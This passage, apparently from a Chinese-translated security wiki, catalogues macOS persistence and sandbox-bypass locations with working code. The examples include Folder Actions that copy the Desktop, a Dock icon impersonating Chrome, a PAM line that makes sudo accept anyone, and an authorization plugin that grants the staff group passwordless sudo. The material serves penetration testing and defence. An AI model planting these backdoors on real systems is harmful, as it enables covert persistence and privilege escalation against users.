1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 创建 Folder Action 工作流并将其安装为服务。
2. 通过文件夹的上下文菜单中的 Folder Actions Setup 手动附加脚本。
3. 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息，以编程方式设置 Folder Action。
- 该方法特别适合将动作嵌入系统中，从而提供一定程度的持久性。

下面的脚本是 Folder Action 可执行的示例：
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
要使上面的脚本可被 Folder Actions 使用，请使用以下命令进行编译：
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
编译脚本后，通过执行下面的脚本来设置 Folder Actions。该脚本将全局启用 Folder Actions，并将先前编译的脚本附加到 Desktop 文件夹。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
使用以下命令运行设置脚本：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- 通过 GUI 实现此持久化的方法如下：

这是将要执行的脚本：
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
用以下命令编译： `osacompile -l JavaScript -o folder.scpt source.js`

将其移动到：
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
然后，打开 `Folder Actions Setup` app，选择你想要监控的 **文件夹**，并在你的情况下选择 **`folder.scpt`**（我在我的情况下把它命名为 output2.scp）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果你用 **Finder** 打开该文件夹，你的脚本就会被执行。

该配置以 base64 格式存储在位于 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 的 **plist** 中。

现在，尝试在没有 GUI 访问的情况下准备这个持久化：

1. **复制 `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 到 `/tmp` 以备份它：
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **删除** 刚才你设置的 Folder Actions：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

现在我们有了一个空的环境

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开 Folder Actions Setup.app 以加载该配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 而这对我来说并没有成功，但这些说明来自该 writeup:(

### Dock 快捷方式

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但你需要在系统内安装一个恶意应用
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `~/Library/Preferences/com.apple.dock.plist`
- **触发条件**：当用户在 Dock 中点击该应用时

#### 描述与利用

Dock 中出现的所有应用都在 plist 中指定：**`~/Library/Preferences/com.apple.dock.plist`**

可以仅用下面的方式**添加一个应用**：
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
使用一些 **social engineering**，你可以在 Dock 中 **冒充（例如 Google Chrome）** 并实际执行你自己的脚本:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 颜色选择器

解析: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 需要执行一个非常特定的动作
- 你将进入另一个 sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/Library/ColorPickers`
- 需要 root 权限
- 触发：使用颜色选择器
- `~/Library/ColorPickers`
- 触发：使用颜色选择器

#### 描述与利用

将你的代码编译成一个颜色选择器 bundle（你可以使用 [**this one for example**](https://github.com/viktorstrate/color-picker-plus)），并添加一个 constructor（如在 [Screen Saver section](macos-auto-start-locations.md#screen-saver) 中所示），然后将该 bundle 复制到 `~/Library/ColorPickers`。

然后，当颜色选择器被触发时，你的代码也会被执行。

注意，加载你的库的二进制文件具有**非常受限的 sandbox**：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync 插件

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **不，因为你需要执行你自己的 app**
- TCC 绕过：???

#### 位置

- 一个特定的 app

#### 描述与利用

带有 Finder Sync Extension 的应用示例 [**可在此处找到**](https://github.com/D00MFist/InSync)。

Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **必须被签名** with some valid Apple developer certificate, it **必须 sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你会进入常见的应用程序 sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
- 需要 root 权限
- **触发条件**：选择屏幕保护程序
- `/Library/Screen Savers`
- 需要 root 权限
- **触发条件**：选择屏幕保护程序
- `~/Library/Screen Savers`
- **触发条件**：选择屏幕保护程序

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述 & 利用

在 Xcode 中创建一个新项目，并选择用于生成新的 **屏幕保护程序** 的模板。然后将你的代码添加到其中，例如下面的代码用于生成日志。

**构建** 它，然后将 `.saver` bundle 复制到 **`~/Library/Screen Savers`**。然后，打开 Screen Saver GUI 并点击它，它应该会生成大量日志：
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> 请注意：由于在加载此代码的二进制文件的 entitlements（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）中可以找到 **`com.apple.security.app-sandbox`**，因此你将处于 **common application sandbox**。

Saver 代码:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight 插件

写作: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你会被限制在应用 sandbox 中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox 看起来非常受限

#### 位置

- `~/Library/Spotlight/`
- **触发**: 创建了一个由 Spotlight 插件 管理扩展名的新文件。
- `/Library/Spotlight/`
- **触发**: 创建了一个由 Spotlight 插件 管理扩展名的新文件。
- 需要 Root 权限
- `/System/Library/Spotlight/`
- **触发**: 创建了一个由 Spotlight 插件 管理扩展名的新文件。
- 需要 Root 权限
- `Some.app/Contents/Library/Spotlight/`
- **触发**: 创建了一个由 Spotlight 插件 管理扩展名的新文件。
- 需要新 app

#### 描述与利用

Spotlight 是 macOS 的内置搜索功能，旨在为用户提供 **对其计算机上数据的快速且全面的访问**.\
为实现这一快速搜索能力，Spotlight 维护一个 **专有数据库**，并通过 **解析大多数文件** 来创建索引，使得可以快速搜索文件名及其内容。

Spotlight 的底层机制涉及一个名为 'mds' 的中央进程，'mds' 代表 **'metadata server.'** 该进程协调整个 Spotlight 服务。作为补充，还有多个 'mdworker' 守护进程执行各种维护任务，例如为不同文件类型建立索引 (`ps -ef | grep mdworker`)。这些任务通过 Spotlight importer 插件，即 **".mdimporter bundles"** 得以实现，允许 Spotlight 理解并索引各种文件格式的内容。

这些插件或 **`.mdimporter`** bundles 位于前面提到的位置，如果出现新的 bundle，会在一分钟内被加载（不需要重启任何服务）。这些 bundle 需要指明它们可以管理的 **文件类型和扩展名**，这样当创建具有指示扩展名的新文件时，Spotlight 就会使用它们。

可以 **查找所有正在加载的 `mdimporters`**:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例如 **/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析这类文件（扩展名包括 `.iba` 和 `.book` 等）：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 如果你检查其他 `mdimporter` 的 Plist，你可能找不到 **`UTTypeConformsTo`** 这一项。那是内置的 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))，不需要指定扩展名。
>
> 此外，系统默认的插件总是优先，所以攻击者只能访问那些未被 Apple 自己的 `mdimporters` 索引的文件。

要创建你自己的 importer，可以从这个项目开始： [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后更改名称、**`CFBundleDocumentTypes`** 并添加 **`UTImportedTypeDeclarations`**，以支持你想支持的扩展，并在 **`schema.xml`** 中反映它们。\
然后 **更改** 函数 **`GetMetadataForFile`** 的代码，以便在创建具有该扩展的文件时执行你的 payload。

最后 **构建并复制你新的 `.mdimporter`** 到之前列出的某个位置，你可以通过 **监控日志** 或检查 **`mdimport -L.`** 来查看它何时被加载。

### ~~偏好面板~~

> [!CAUTION]
> 看起来这不再起作用了。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 需要特定的用户操作
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### 描述

看起来这不再起作用了。

## Root Sandbox Bypass

> [!TIP]
> 在这里你可以找到对 **sandbox bypass** 有用的启动位置，这些位置允许你通过**将其写入文件**以 **root** 身份来简单地执行某些东西，和/或需要其他**奇怪的条件。**

### 定期

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root required
- **Trigger**: When the time comes
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Root required
- **Trigger**: When the time comes

#### 描述与利用

这些周期脚本（**`/etc/periodic`**）是由配置在 `/System/Library/LaunchDaemons/com.apple.periodic*` 的 **launch daemons** 执行的。注意，存放在 `/etc/periodic/` 的脚本会以**文件所有者**的身份**执行**，因此这不能用于潜在的权限提升。
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
还有其他将在 **`/etc/defaults/periodic.conf`** 中指定并会被执行的周期性脚本：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **executed sooner or later**.

> [!WARNING]
> 请注意，定期脚本会以 **脚本所有者的身份执行**。因此，如果脚本由普通用户拥有，它将以该用户身份执行（这可能会阻止提权攻击）。

### PAM

参考： [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
参考： [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Root always required

#### Description & Exploitation

由于 PAM 更多侧重于 **persistence** 和 macOS 上的恶意软件持久化，而非在 macOS 内的简单执行，本博客不会给出详细解释，**请阅读相关 writeups 以更好地理解该技术**。

检查 PAM 模块：
```bash
ls -l /etc/pam.d
```
滥用 PAM 的 persistence/privilege escalation 技术很简单：修改模块 /etc/pam.d/sudo，在开头添加如下行：
```bash
auth       sufficient     pam_permit.so
```
所以它会 **看起来像** 这样：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
因此，任何尝试使用 **`sudo` 都会有效**。

> [!CAUTION]
> 请注意，此目录受 TCC 保护，因此用户很可能会收到一个请求访问的提示。

另一个很好的例子是 su，你可以看到也可以向 PAM 模块传递参数（并且你也可以 backdoor 这个文件）：
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

参考文档: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
参考文档: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root 并进行额外配置
- TCC bypass: ???

#### 位置

- `/Library/Security/SecurityAgentPlugins/`
- 需要 root 权限
- 还需要配置授权数据库以使用该插件

#### 描述与利用

你可以创建一个 authorization plugin，在用户登录时执行以维持持久性。有关如何创建这些插件的更多信息，请查看上面的参考文档（注意：写得不好的插件可能会把你锁在外面，你可能需要从恢复模式清理你的 Mac）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Move** 将 bundle 移动到要加载的位置：
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最后添加 **规则** 以加载此 Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** 会告诉授权框架它需要 **调用外部机制进行授权**。此外，**`privileged`** 会使其以 root 身份执行。

使用下列方式触发：
```bash
security authorize com.asdf.asdf
```
然后 **staff 组应该具有 sudo 访问权限**（阅读 `/etc/sudoers` 以确认）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root，并且用户必须使用 man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- 需要 root 权限
- **`/private/etc/man.conf`**：每当使用 man 时

#### Description & Exploit

配置文件 **`/private/etc/man.conf`** 指示在打开 man 文档文件时要使用的 binary/script。因此可执行文件的路径可以被修改，这样每当用户使用 man 阅读某些文档时，会执行一个 backdoor。

例如在 **`/private/etc/man.conf`** 中设置：
```
MANPAGER /tmp/view
```
然后创建 `/tmp/view` 为：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- 对 bypass sandbox 有用: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root，并且 apache 需要在运行中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd 没有 entitlements

#### Location

- **`/etc/apache2/httpd.conf`**
- 需要 root 权限
- Trigger: 当 Apache2 启动时

#### 描述与 Exploit

你可以在 `/etc/apache2/httpd.conf` 中指定加载一个 module，添加如下行：
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
这样你的已编译模块将被 Apache 加载。唯一的问题是，你要么需要**用有效的 Apple 证书对其进行签名**，要么需要在系统中**添加一个新的受信任证书**，并用它**对其进行签名**。

然后，如果需要，为确保服务器会启动，你可以执行：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb 的代码示例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM 审计框架

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- 有助于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root，auditd 正在运行并触发一个警告
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/etc/security/audit_warn`**
- 需要 root 权限
- **触发**：当 auditd 检测到警告时

#### 描述 & Exploit

每当 auditd 检测到警告时，脚本 **`/etc/security/audit_warn`** 会被 **执行**。因此你可以将你的 payload 添加到该脚本中。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
你可以使用 `sudo audit -n` 强制触发警告。

### 启动项

> [!CAUTION] > **此项已弃用，因此在这些目录中不应找到任何内容。**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: A shell script executed at startup.
2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.

Ensure that both the rc script and the `StartupParameters.plist` file are correctly placed inside the **StartupItem** directory for the startup process to recognize and utilize them。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 我无法在我的 macOS 中找到此组件，更多信息请查看该报告

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

由 Apple 引入，**emond** 是一种日志机制，似乎未被充分开发或可能已被弃用，但仍然可用。尽管对 Mac 管理员并无太大帮助，这个鲜为人知的服务可能被攻击者用作一种隐蔽的持久化方法，且很可能不会被大多数 macOS 管理员注意到。

对于知道其存在的人来说，识别对 **emond** 的恶意使用很简单。系统为该服务配置的 LaunchDaemon 会在单一目录中查找要执行的脚本。要检查这一点，可以使用以下命令：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 位置

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- 需要 Root
- **触发条件**：与 XQuartz 相关

#### 描述 & Exploit

XQuartz **不再随 macOS 安装**，所以如果你想了解更多信息请查看 writeup。

### ~~kext~~

> [!CAUTION]
> 即使以 root 身份安装 kext 也非常复杂，因此我不会将其视为用于逃逸 sandboxes 或用于 persistence 的方法（除非你有 exploit）

#### 位置

要将 KEXT 安装为启动项，它需要被 **安装在以下位置之一**：

- `/System/Library/Extensions`
- 内置于 OS X 操作系统的 KEXT 文件
- `/Library/Extensions`
- 由第三方软件安装的 KEXT 文件

你可以使用以下命令列出当前加载的 kext 文件：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- 需要 root 权限

#### 描述与利用

显然 `/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 在暴露一个 XPC service 时使用了这个二进制……问题是该二进制不存在，因此你可以把东西放在那里，当 XPC service 被调用时你的二进制就会被执行。

我在我的 macOS 中已无法再找到它。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- 需要 root 权限
- **Trigger**: 当该服务运行时（很少）

#### 描述与利用

显然很少有人会运行这个脚本，我甚至在我的 macOS 中找不到它，如果你想了解更多信息请查看 writeup。

### ~~/etc/rc.common~~

> [!CAUTION] > **这在现代 MacOS 版本中不起作用**

也可以在这里放置 **将在启动时执行的命令。** 示例常规 rc.common 脚本：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

